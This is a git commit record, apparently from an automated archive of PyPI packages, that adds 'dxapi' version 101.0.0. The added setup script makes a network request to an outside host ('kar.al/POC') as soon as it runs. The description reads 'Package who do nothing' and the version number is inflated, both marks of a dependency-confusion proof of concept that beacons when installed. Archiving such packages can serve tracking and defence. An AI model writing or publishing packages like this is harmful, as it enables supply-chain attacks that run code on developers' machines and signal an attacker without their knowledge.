e773e8dfafa15e78f621809dc8aa33111b128d86
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-07-06 03:03:54 +0000

    Add package dxapi/101.0.0/dxapi-101.0.0.tar.gz

---
+++ packages/dxapi/dxapi-101.0.0.tar.gz/dxapi-101.0.0/test.py
@@ -0,0 +1,8 @@
+from setuptools import setup
+import requests
+requests.get('https://kar.al/POC')
+setup(name='dxapi',
+      version='101.0.0',
+      description='Package who do nothing',
+      author='Secret12345'
+)
